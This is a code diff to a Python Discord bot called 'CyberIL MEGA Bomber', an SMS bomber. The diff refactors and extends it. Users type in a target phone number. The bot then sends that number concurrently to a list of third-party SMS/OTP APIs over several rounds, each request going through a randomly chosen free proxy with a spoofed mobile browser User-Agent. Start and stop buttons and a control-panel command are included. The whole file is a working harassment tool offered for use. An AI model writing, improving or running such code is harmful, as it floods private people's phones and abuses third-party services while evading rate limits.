@@ -6,10 +6,13 @@ import random
 import os
 from datetime import datetime
 
-# ==================== CONFIG ====================
+# ==================== CONFIG & INTENTS ====================
 TOKEN = os.getenv("BOT_TOKEN")
 
-# 🔥 200+ פרוקסי ישראליים וכלליים - הרשימה המלאה שלך
+intents = discord.Intents.default()
+intents.message_content = True  # תיקון ה-Warning מהלוגים שלך
+intents.members = True
+
 FREE_ISRAEL_PROXIES_FULL = [
     "51.4.59.110:1080", "51.85.49.118:29177", "51.85.49.118:9198", "51.85.49.118:22901",
     "51.85.49.118:1521", "51.85.49.118:35524", "51.85.49.118:176", "51.85.49.118:39907",
@@ -107,83 +110,81 @@ ALL_WORKING_APIs = [
 ]
 
 active_bombs = {}
+# ==================== ENGINE ====================
 
-# ==================== ENGINE (עם דימוי דפדפן ופרוקסי) ====================
-
-async def run_attack(session, api, phone, user_id):
+async def send_sms(session, api, phone, user_id):
     if active_bombs.get(user_id) is False: return
     
-    phone_no_zero = phone[1:] if phone.startswith('0') else phone
+    no_zero = phone[1:] if phone.startswith('0') else phone
     
-    # החלפת תגיות ב-Data
-    def fix(data):
-        if isinstance(data, dict): return {k: fix(v) for k, v in data.items()}
-        if isinstance(data, str): return data.replace("{{phone}}", phone).replace("{{phone_no_zero}}", phone_no_zero)
-        return data
+    def process(d):
+        if isinstance(d, dict): return {k: process(v) for k, v in d.items()}
+        if isinstance(d, str): return d.replace("{{phone}}", phone).replace("{{phone_no_zero}}", no_zero)
+        return d
 
-    payload = fix(api.get("json"))
-    params = fix(api.get("params"))
-
-    # דימוי דפדפן (Browser Simulation)
+    payload, params = process(api.get("json")), process(api.get("params"))
+    
     headers = {
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
-        "Referer": "https://google.com",
-        "Origin": api["url"].split("/")[2]
+        "Accept": "application/json", "Referer": "https://google.com"
     }
     
-    # בחירת פרוקסי רנדומלי מהרשימה
-    proxy_url = f"http://{random.choice(FREE_ISRAEL_PROXIES_FULL)}"
+    proxy = f"http://{random.choice(FREE_ISRAEL_PROXIES_FULL)}"
 
     try:
-        async with session.request(
-            api["method"], api["url"], 
-            json=payload, params=params, 
-            headers=headers, proxy=proxy_url, 
-            timeout=10
-        ) as resp:
-            return resp.status
+        async with session.request(api["method"], api["url"], json=payload, params=params, headers=headers, proxy=proxy, timeout=8) as r:
+            return r.status
     except:
         return None
 
-# ==================== DISCORD UI ====================
+# ==================== UI & COMMANDS ====================
 
-class BomberModal(discord.ui.Modal, title='🔥 CyberIL - Professional Bomber'):
-    phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX', min_length=10, max_length=10)
-    rounds = discord.ui.TextInput(label='סבבים (1-5)', default='1')
+class BomberModal(discord.ui.Modal, title='🔥 CyberIL MEGA Bomber'):
+    phone = discord.ui.TextInput(label='Target Number', placeholder='05XXXXXXXX', min_length=10, max_length=10)
+    rounds = discord.ui.TextInput(label='Rounds (1-5)', default='1')
 
     async def on_submit(self, interaction: discord.Interaction):
         target = self.phone.value
-        if target == "0535524017": # הגנה
-            return await interaction.response.send_message("❌ המערכת חסומה למספר זה.", ephemeral=True)
+        if target == "0535524017":
+            return await interaction.response.send_message("❌ Restricted number.", ephemeral=True)
             
-        await interaction.response.send_message(f"🚀 תקיפה רחבה החלה על {target}...", ephemeral=True)
+        await interaction.response.send_message(f"🚀 Launching attack on {target}...", ephemeral=True)
         user_id = interaction.user.id
         active_bombs[user_id] = True
         
         async with aiohttp.ClientSession() as session:
             for r in range(int(self.rounds.value)):
                 if active_bombs.get(user_id) is False: break
-                tasks = [run_attack(session, api, target, user_id) for api in ALL_WORKING_APIs]
+                tasks = [send_sms(session, api, target, user_id) for api in ALL_WORKING_APIs]
                 await asyncio.gather(*tasks)
                 await asyncio.sleep(2)
-                
+        
         active_bombs.pop(user_id, None)
+
+class BomberView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+    
+    @discord.ui.button(label="🚀 Start Bombing", style=discord.ButtonStyle.danger, custom_id="start_btn")
+    async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(BomberModal())
+
+    @discord.ui.button(label="🛑 Stop", style=discord.ButtonStyle.grey, custom_id="stop_btn")
+    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
+        active_bombs[interaction.user.id] = False
+        await interaction.response.send_message("🛑 Attack Stopped.", ephemeral=True)
 
 class MyBot(commands.Bot):
     def __init__(self):
-        super().__init__(command_prefix='!', intents=discord.Intents.default())
-    async def setup_hook(self): await self.tree.sync()
+        super().__init__(command_prefix='!', intents=intents)
+    async def setup_hook(self):
+        await self.tree.sync()
 
 bot = MyBot()
 
-@bot.tree.command(name="setup")
+@bot.tree.command(name="setup", description="Open Bomber Control Panel")
 async def setup(interaction: discord.Interaction):
-    view = discord.ui.View()
-    btn = discord.ui.button(label="🚀 התחל תקיפה", style=discord.ButtonStyle.danger)
-    btn.callback = lambda i: i.response.send_modal(BomberModal())
-    view.add_item(btn)
-    await interaction.response.send_message("לוח בקרה SMS Bomber", view=view)
+    embed = discord.Embed(title="🚀 CyberIL Bomber v3", description="System Ready. All APIs & Proxies loaded.", color=0xff0000)
+    await interaction.response.send_message(embed=embed, view=BomberView())
 
 bot.run(TOKEN)
